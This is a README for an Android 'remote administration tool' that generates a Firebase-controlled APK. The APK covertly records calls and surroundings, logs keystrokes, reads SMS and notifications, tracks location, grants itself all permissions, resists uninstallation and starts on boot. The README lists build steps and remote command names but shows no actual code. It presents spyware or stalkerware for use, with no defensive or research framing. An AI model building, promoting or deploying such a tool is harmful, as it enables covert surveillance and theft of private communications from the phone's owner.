# Android Remote Administration Tool

This tool generates an Android APK capable of performing various remote administration tasks via Firebase.

## Features

- Automatic call recording (incoming/outgoing)
- Take screenshots
- Monitor device location
- Record surrounding sounds
- Read SMS
- Key logger
- Read notifications
- Grant itself all permissions
- Cannot be uninstalled
- Runs in the background on device boot

## Setup Instructions

### Prerequisites

- Python 3.6 or later
- Termux on Android device
- Java Development Kit (JDK)
- Android SDK
- Firebase project and service account

### Steps

1. **Clone the Repository:**

    ```sh
    git clone https://github.com/yourusername/your-repo.git
    cd your-repo
    ```

2. **Generate Base APK:**

    ```sh
    python generate_base_apk.py
    ```

3. **Create Manifest:**

    ```sh
    python create_manifest.py
    ```

4. **Implement Java Code:**

    ```sh
    python implement_java_code.py
    ```

5. **Compile APK:**

    ```sh
    python compile_apk.py
    ```

6. **Start Server:**

    ```sh
    python server.py
    ```

## Commands

Send the following commands via Firebase to control the APK:

- `record_call`
- `take_screenshot`
- `monitor_location`
- `record_surroundings`
- `read_sms`
- `key_logger`
- `read_notifications`
